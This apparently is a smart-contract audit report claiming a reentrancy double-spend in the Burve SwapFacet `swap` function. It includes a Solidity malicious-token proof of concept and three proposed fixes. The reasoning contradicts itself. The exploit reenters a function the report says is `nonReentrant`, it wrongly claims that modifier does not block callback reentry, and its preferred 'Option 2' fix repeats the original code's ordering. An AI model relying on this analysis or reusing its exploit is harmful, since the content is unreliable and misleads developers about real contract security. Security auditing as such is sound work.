# Reentrancy Vulnerability in SwapFacet Allows Double Spending


**TL;DR**: External token transfers occur before internal state updates, allowing a malicious token to reenter and drain funds â€” despite the use of `nonReentrant`

## Summary
The SwapFacet contract (https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/multi/facets/SwapFacet.sol#L52-#L135) contains a reentrancy vulnerability in its `swap` function that can be exploited by malicious tokens to perform double-spending attacks. Despite using the `nonReentrant` modifier, the contract performs external calls to transfer tokens before updating internal state, creating a window for reentrancy attacks.

## Vulnerability Details
The vulnerability exists in the `swap` function of the SwapFacet contract:

```solidity
function swap(
    address recipient,
    address inToken,
    address outToken,
    int256 amountSpecified,
    uint256 amountLimit,
    uint16 _cid
) external nonReentrant returns (uint256 inAmount, uint256 outAmount) {
    // ... code omitted for brevity ...

    if (inAmount > 0) {
        // Get the tokens
        TransferHelper.safeTransferFrom(
            inToken,
            msg.sender,
            address(this),
            inAmount
        );
        c.addEarnings(inVid, realTax);
        Store.vertex(inVid).deposit(cid, inAmount - realTax);
        Store.vertex(outVid).withdraw(cid, outAmount, true);
        require(outAmount > 0, VacuousSwap());
        TransferHelper.safeTransfer(outToken, recipient, outAmount);
    }

    // ... code omitted for brevity ...
}
```

The issue is that the contract calls `TransferHelper.safeTransferFrom()` to transfer tokens from the user to the contract before updating the internal state. If the token being transferred is malicious and implements a callback function in its `transferFrom` method, it can call back into the `swap` function before the first swap is completed.

Despite using the `nonReentrant` modifier, the vulnerability persists because state changes happen after external calls, allowing reentrancy during token transfer to exploit stale internal state. The vulnerability arises because:

1. The malicious token's `transferFrom` function can execute arbitrary code during the transfer
2. This code can call back into the `swap` function, which will be protected by `nonReentrant` but will operate on the same shared mutable storage
3. When control returns to the original `swap` function, it continues execution with outdated state information

This issue is critical because the storage updated by `Store.vertex(...).deposit/withdraw` is shared across swaps, and the attacker can exploit this to perform multiple withdrawals against the same deposit. The vertex balances in storage represent the protocol's accounting system, and inconsistencies here directly lead to fund loss.
Note: `nonReentrant` only protects against reentry into the same function from the same external context. It does not prevent reentrancy triggered via external contract calls, such as token callbacks.
## Impact
This vulnerability can be exploited to:

1. **Double Spend Tokens**: An attacker can execute multiple swaps while only paying for one
2. **Drain Protocol Liquidity**: By repeatedly exploiting this vulnerability, an attacker could drain a significant portion of the protocol's liquidity
3. **Manipulate Price Calculations**: The inconsistent state can lead to incorrect price calculations and further exploits

The severity is classified as High because:
- It directly leads to loss of funds for the protocol
- It affects a core function (swapping) that is central to the protocol's operation
- It can be exploited by any user with a malicious token
- The potential financial impact is significant

## Proof of Concept
A malicious token can be created that performs a callback during the `transferFrom` operation:

```solidity
contract MaliciousToken is ERC20 {
    address public target;           // SwapFacet contract address
    address public attacker;        // Attacker's address
    address public legitimateToken; // A legitimate token to swap to
    bool public exploitActive;      // Flag to prevent recursive exploitation
    uint256 public exploitAmount;   // Amount to use in the exploit

    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }

    function setExploitParameters(
        address _target,
        address _attacker,
        address _legitimateToken,
        uint256 _amount
    ) external {
        target = _target;
        attacker = _attacker;
        legitimateToken = _legitimateToken;
        exploitAmount = _amount;
    }
    // Reentrant call back into swap using same storage context
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        // Only perform the exploit during specific transfers
        if (exploitActive && from == attacker && to == target) {
            exploitActive = false; // Prevent recursive exploitation

            // Call back into the vulnerable contract with a legitimate swap
            // Note: We're swapping to a different token to avoid any checks that
            // might prevent swapping a token to itself
            SwapFacet(target).swap(
                attacker,               // recipient (attacker gets the tokens)
                address(this),          // inToken (the malicious token)
                legitimateToken,        // outToken (a legitimate token to receive)
                int256(exploitAmount),  // amountSpecified (exact input amount)
                0,                      // amountLimit (no slippage protection for simplicity)
                0                       // _cid (closure ID, using 0 for simplicity)
            );

            exploitActive = true;
        }

        return super.transferFrom(from, to, amount);
    }
}
```

The attack would proceed as follows:

1. Attacker deploys the malicious token
2. Attacker calls `swap` with the malicious token as the input token
3. During the `TransferHelper.safeTransferFrom` call, the malicious token's `transferFrom` function is called
4. The malicious token calls back into the `swap` function before the first swap completes
5. The second swap executes with the same state as the first swap - critically, it reuses the same inVid and outVid values (which represent the input/output token vaults) while their balances have not been updated yet
6. Both swaps complete, but the attacker only pays for one swap
7. The result is a double withdrawal from the same deposit, as the vertex balances are only updated after both transfers have been initiated

## Recommended Mitigation
There are three effective approaches to fix this vulnerability:

### Option 1: Implement the checks-effects-interactions pattern
This is the most robust solution and follows best practices:

```solidity
function swap(
    address recipient,
    address inToken,
    address outToken,
    int256 amountSpecified,
    uint256 amountLimit,
    uint16 _cid
) external nonReentrant returns (uint256 inAmount, uint256 outAmount) {
    // ... existing code ...

    if (inAmount > 0) {
        // 1. First update all internal state
        c.addEarnings(inVid, realTax);
        Store.vertex(inVid).deposit(cid, inAmount - realTax);
        Store.vertex(outVid).withdraw(cid, outAmount, true);
        require(outAmount > 0, VacuousSwap());

        // 2. Then perform external calls
        TransferHelper.safeTransferFrom(
            inToken,
            msg.sender,
            address(this),
            inAmount
        );
        TransferHelper.safeTransfer(outToken, recipient, outAmount);
    }

    // ... existing code ...
}
```

### Option 2: Move token transfer before state changes
Alternatively, the `safeTransferFrom` call can be moved before any internal state updates, eliminating the risk of reentrancy from a malicious token:

```solidity
function swap(
    address recipient,
    address inToken,
    address outToken,
    int256 amountSpecified,
    uint256 amountLimit,
    uint16 _cid
) external nonReentrant returns (uint256 inAmount, uint256 outAmount) {
    // ... calculation code ...

    if (inAmount > 0) {
        // 1. First get the tokens (external call happens before any state changes)
        TransferHelper.safeTransferFrom(
            inToken,
            msg.sender,
            address(this),
            inAmount
        );

        // 2. Then update internal state (safe from reentrancy now)
        c.addEarnings(inVid, realTax);
        Store.vertex(inVid).deposit(cid, inAmount - realTax);
        Store.vertex(outVid).withdraw(cid, outAmount, true);
        require(outAmount > 0, VacuousSwap());

        // 3. Finally transfer output tokens
        TransferHelper.safeTransfer(outToken, recipient, outAmount);
    }

    // ... existing code ...
}
```

### Option 3: Use a pull-over-push pattern for output tokens
Implement a two-step process where users claim their tokens in a separate transaction:

```solidity
// Step 1: Execute swap but don't transfer output tokens
function swap(...) external nonReentrant {
    // ... calculation code ...

    // Transfer input tokens
    TransferHelper.safeTransferFrom(inToken, msg.sender, address(this), inAmount);

    // Update state
    c.addEarnings(inVid, realTax);
    Store.vertex(inVid).deposit(cid, inAmount - realTax);
    Store.vertex(outVid).withdraw(cid, outAmount, true);

    // Record pending withdrawal instead of transferring
    pendingWithdrawals[recipient][outToken] += outAmount;

    emit SwapExecuted(...);
}

// Step 2: Claim output tokens in a separate transaction
function claimTokens(address token) external nonReentrant {
    uint256 amount = pendingWithdrawals[msg.sender][token];
    require(amount > 0, "No pending withdrawal");

    pendingWithdrawals[msg.sender][token] = 0;
    TransferHelper.safeTransfer(token, msg.sender, amount);
}
```

**We recommend Option 2 as the most straightforward and safe fix in this context**, as it avoids any interactions with user-controlled contracts before internal state updates. While Option 1 follows the checks-effects-interactions pattern (best practice), Option 2 is simpler to implement and eliminates the attack vector entirely by ensuring no external calls occur before state changes.

Option 3 changes the user experience but provides additional security benefits for protocols that prioritize maximum security over UX.

### Additional Security Considerations

1. **Token Blacklisting**: Consider blacklisting or treating with caution tokens like ERC777 or ERC20 with hooks that could enable reentrancy.

2. **Reentrancy Guard Limitations**: Even when using OpenZeppelin's `nonReentrant` modifier, external calls to tokens controlled by untrusted users should always be treated as potentially reentrant. The modifier only protects against direct reentrancy into functions with the same modifier.

3. **State Validation**: Consider adding additional state validation checks before and after external calls to detect inconsistencies that could indicate an attack in progress.
